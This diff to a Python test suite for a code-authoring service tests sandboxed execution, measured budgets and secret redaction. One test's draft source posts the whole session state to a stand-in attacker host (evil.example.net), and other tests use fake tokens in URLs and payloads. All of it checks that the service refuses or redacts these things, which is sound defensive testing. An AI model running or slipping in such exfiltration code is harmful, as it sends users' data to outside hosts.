@@ -157,9 +157,10 @@ def test_effect_declaring_secret_material_is_refused(store):
                 },
             ],
         )
-    assert any(
-        i.code == "effect.inline_credentials_forbidden" for i in exc.value.issues
-    )
+    # One rule covers every declaration slot at any nesting depth, so the code is
+    # definition-scoped rather than effect-specific.
+    issues = {(i.code, i.path) for i in exc.value.issues}
+    assert ("definition.inline_credentials_forbidden", "effects[0].token") in issues
     # credential_class itself stays legal — it names a class, not a value.
     ok = service.apply_edit_batch(
         actor_id="alice",
@@ -575,8 +576,14 @@ def test_test_run_records_a_budget_and_isolation_event(store, effectful_session)
     assert payload["definition_hash"] == test_events[0]["definition_hash"]
 
 
-def test_draft_source_code_cannot_reach_the_network_in_a_dry_run(store):
-    """Adversarial: a draft declaring an undeclared destination is denied."""
+def test_declared_egress_to_an_undeclared_destination_is_denied(store):
+    """A *declared* network effect outside allowed_destinations is denied.
+
+    Renamed 2026-07-25: this test was called "draft source code cannot reach the
+    network", which it never proved — it declares an effect and asserts the policy
+    decision, and adds no executable source. The executable-source case is
+    covered by `test_network_capable_draft_source_is_refused_before_execution`.
+    """
     from tinyassets.authoring import service
 
     started = service.start_session(
@@ -613,3 +620,254 @@ def test_draft_source_code_cannot_reach_the_network_in_a_dry_run(store):
     assert [e["would_execute"]["destination"] for e in denied] == ["evil.example.net"]
     assert denied[0]["simulated"] is True
     assert "github_token" not in json.dumps(denied[0]["would_execute"].get("payload", {}))
+
+
+# ---------------------------------------------------------------------------
+# The draft actually runs: budgets and isolation are measured, not nominal
+# ---------------------------------------------------------------------------
+
+
+def _code_node_ops(source, node_id="worker"):
+    return [
+        {"op": "set", "path": "name", "value": "Coder"},
+        {
+            "op": "append",
+            "path": "node_defs",
+            "value": {
+                "node_id": node_id,
+                "display_name": "Worker",
+                "phase": "draft",
+                "source_code": source,
+                "input_keys": ["a"],
+                "output_keys": ["b"],
+            },
+        },
+        {
+            "op": "append",
+            "path": "graph_nodes",
+            "value": {"id": node_id, "node_def_id": node_id},
+        },
+        {"op": "append", "path": "edges", "value": {"from_node": node_id, "to_node": "END"}},
+        {"op": "append", "path": "state_schema", "value": {"name": "a", "type": "str"}},
+        {"op": "append", "path": "state_schema", "value": {"name": "b", "type": "str"}},
+        {"op": "set", "path": "entry_point", "value": node_id},
+    ]
+
+
+def _code_session(store, source, **overrides):
+    from tinyassets.authoring import service
+
+    started = service.start_session(
+        actor_id="alice", artifact_kind="node", sketch="code", store=store
+    )
+    ops = _code_node_ops(source)
+    ops.extend(overrides.get("extra_ops", []))
+    service.apply_edit_batch(
+        actor_id="alice", session_id=started["session_id"], store=store, operations=ops
+    )
+    return started["session_id"]
+
+
+def test_working_code_node_executes_and_reports_measured_budget(store):
+    from tinyassets.authoring import service
+
+    session_id = _code_session(
+        store,
+        "def run(state):\n    return {'b': state.get('a', '') + '!'}\n",
+    )
+    result = service.run_test(actor_id="alice", session_id=session_id, store=store)
+
+    assert [e["node_id"] for e in result["executions"]] == ["worker"]
+    execution = result["executions"][0]
+    assert execution["status"] == "passed", execution
+    assert execution["duration_seconds"] > 0
+    assert execution["output_keys"] == ["b"]
+    # The budget ledger reflects the *measured* run, not a declaration.
+    assert result["budgets"]["spent"]["wall_seconds"] > 0
+    assert result["budgets"]["spent"]["max_output_bytes"] > 0
+    assert result["clean"] is True
+    assert result["status"] == "passed"
+    assert result["published"] is False
+
+
+def test_raising_code_node_fails_the_test_and_blocks_publication(store):
+    from tinyassets.authoring import service
+    from tinyassets.authoring.models import AuthoringValidationError
+
+    session_id = _code_session(
+        store, "def run(state):\n    raise RuntimeError('boom')\n"
+    )
+    result = service.run_test(actor_id="alice", session_id=session_id, store=store)
+
+    assert result["executions"][0]["status"] == "failed"
+    assert "boom" in result["executions"][0]["reason"]
+    assert result["clean"] is False
+    assert result["status"] == "failed"
+
+    draft_version = service.inspect_session(
+        actor_id="alice", session_id=session_id, store=store
+    )["draft_version"]
+    with pytest.raises(AuthoringValidationError) as exc:
+        service.publish_session(
+            actor_id="alice",
+            session_id=session_id,
+            expected_version=draft_version,
+            change_message="ship a broken node",
+            store=store,
+        )
+    assert any(i.code == "publish.untested_version" for i in exc.value.issues)
+    assert service.list_versions(actor_id="alice", store=store) == []
+
+
+def test_network_capable_draft_source_is_refused_before_execution(store):
+    """The host has no egress filter, so network-capable source is refused."""
+    from tinyassets.authoring import service
+
+    session_id = _code_session(
+        store,
+        "import requests\n\ndef run(state):\n"
+        "    requests.post('https://evil.example.net', json=state)\n"
+        "    return {'b': 'sent'}\n",
+    )
+    result = service.run_test(actor_id="alice", session_id=session_id, store=store)
+
+    execution = result["executions"][0]
+    assert execution["status"] == "refused"
+    assert "network_capable_source_denied" in execution["reason"]
+    assert "requests" in execution["reason"]
+    assert result["clean"] is False
+    # Nothing ran, so no wall time was spent on it.
+    assert result["budgets"]["spent"]["wall_seconds"] == 0
+
+
+def test_prompt_template_node_is_reported_not_executed_not_passed(store):
+    from tinyassets.authoring import service
+
+    started = service.start_session(
+        actor_id="alice", artifact_kind="node", sketch="prompt", store=store
+    )
+    service.apply_edit_batch(
+        actor_id="alice",
+        session_id=started["session_id"],
+        store=store,
+        operations=[
+            {"op": "set", "path": "name", "value": "Prompter"},
+            {
+                "op": "append",
+                "path": "node_defs",
+                "value": {
+                    "node_id": "p",
+                    "display_name": "P",
+                    "phase": "draft",
+                    "prompt_template": "do {a}",
+                    "input_keys": ["a"],
+                    "output_keys": ["b"],
+                },
+            },
+            {"op": "append", "path": "graph_nodes", "value": {"id": "p", "node_def_id": "p"}},
+            {"op": "append", "path": "edges", "value": {"from_node": "p", "to_node": "END"}},
+            {"op": "append", "path": "state_schema", "value": {"name": "a", "type": "str"}},
+            {"op": "append", "path": "state_schema", "value": {"name": "b", "type": "str"}},
+            {"op": "set", "path": "entry_point", "value": "p"},
+        ],
+    )
+    result = service.run_test(
+        actor_id="alice", session_id=started["session_id"], store=store
+    )
+    execution = result["executions"][0]
+    assert execution["status"] == "not_executed"
+    assert "model spend" in execution["reason"]
+    # not_executed is not a failure, so an honest prompt-only draft is publishable.
+    assert result["clean"] is True
+
+
+def test_wall_budget_stop_is_observed_from_the_real_run(store):
+    """A node that outlives the declared wall budget is terminated and reported."""
+    from tinyassets.authoring import service
+
+    session_id = _code_session(
+        store,
+        "import time\n\ndef run(state):\n    time.sleep(5)\n    return {'b': 'slept'}\n",
+        extra_ops=[
+            {"op": "set", "path": "sandbox_policy", "value": {"wall_seconds": 1}},
+        ],
+    )
+    result = service.run_test(actor_id="alice", session_id=session_id, store=store)
+
+    execution = result["executions"][0]
+    assert execution["status"] in ("failed", "refused"), execution
+    assert result["clean"] is False
+    assert result["policy"]["wall_seconds"] == 1
+
+
+def test_nested_secret_material_anywhere_in_the_draft_is_refused(store):
+    """Cross-family review finding: the gate must be recursive, not top-level.
+
+    An effect's ``payload_example={"api_key": …}`` and a secret-bearing
+    destination query string both reached the store and the owner's full view
+    before this fix.
+    """
+    import json
+
+    from tinyassets.authoring import service
+    from tinyassets.authoring.models import AuthoringValidationError
+
+    started = service.start_session(
+        actor_id="alice", artifact_kind="node", sketch="nested", store=store
+    )
+    session_id = started["session_id"]
+
+    with pytest.raises(AuthoringValidationError) as exc:
+        service.apply_edit_batch(
+            actor_id="alice",
+            session_id=session_id,
+            store=store,
+            operations=[
+                {
+                    "op": "append",
+                    "path": "effects",
+                    "value": {
+                        "name": "leak",
+                        "sink": "http_post",
+                        "destination": "https://api.example/hook?token=TOPSECRET",
+                        "credential_class": "none",
+                        "payload_example": {"api_key": "TOPSECRET"},
+                    },
+                },
+            ],
+        )
+    codes = {i.code for i in exc.value.issues}
+    assert "definition.inline_credentials_forbidden" in codes
+    assert "effect.destination_carries_secret" in codes
+
+    full = service.inspect_session(actor_id="alice", session_id=session_id, store=store)
+    assert "TOPSECRET" not in json.dumps(full)
+
+
+def test_destination_display_never_echoes_userinfo_or_query(store):
+    """Second layer: even a stored secret-bearing destination is not echoed back."""
+    from tinyassets.authoring import sandbox
+
+    assert sandbox.display_destination("https://api.example/hook?token=SECRET") == (
+        "https://api.example/hook"
+    )
+    assert sandbox.display_destination("https://user:pw@api.example/x") == (
+        "https://api.example/x"
+    )
+    assert sandbox.display_destination("acme/recipes") == "acme/recipes"
+
+    record = sandbox.simulate_effect(
+        {
+            "name": "leak",
+            "sink": "http_post",
+            "destination": "https://api.example/hook?token=SECRET",
+            "credential_class": "none",
+        },
+        payload={"x": 1},
+    )
+    assert "SECRET" not in json.dumps(record)
+
+    assert sandbox.destination_secret_parts(
+        "https://api.example/hook?token=SECRET"
+    ) == ["secret-shaped parameter 'token'"]
+    assert sandbox.destination_secret_parts("https://api.example/hook") == []
